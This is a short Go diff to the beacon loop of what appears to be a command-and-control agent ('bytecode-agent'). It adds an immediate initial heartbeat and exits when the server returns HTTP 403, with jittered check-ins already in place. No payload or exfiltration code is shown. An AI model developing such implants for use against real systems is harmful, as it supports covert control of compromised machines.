@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"log"
 	"math/rand"
+	"strings"
 	"time"
 
 	"bytecode-agent/internal/comms"
@@ -13,9 +14,16 @@ import (
 )
 
 // Loop runs the main beacon loop forever
-func Loop(client *comms.Client, cfg *config.Config) {
+func Loop(client *comms.Client, cfg *config.Config) error {
 	log.Println("[BEACON] Starting beacon loop...")
 	log.Printf("[BEACON] Interval: %d-%ds (jitter)\n", cfg.BeaconMin, cfg.BeaconMax)
+
+	// Perform initial beacon immediately
+	log.Println("[BEACON] Performing initial heartbeat...")
+	if _, err := client.Beacon(); err != nil {
+		log.Printf("[BEACON] Initial heartbeat failed: %v\n", err)
+		return err
+	}
 
 	for {
 		// Sleep with jitter
@@ -28,6 +36,11 @@ func Loop(client *comms.Client, cfg *config.Config) {
 		resp, err := client.Beacon()
 		if err != nil {
 			log.Printf("[BEACON] Error: %v\n", err)
+			
+			// If we get a 403, our identity is likely invalid
+			if strings.Contains(err.Error(), "HTTP 403") {
+				return fmt.Errorf("identity invalid (403): %w", err)
+			}
 			continue
 		}
 
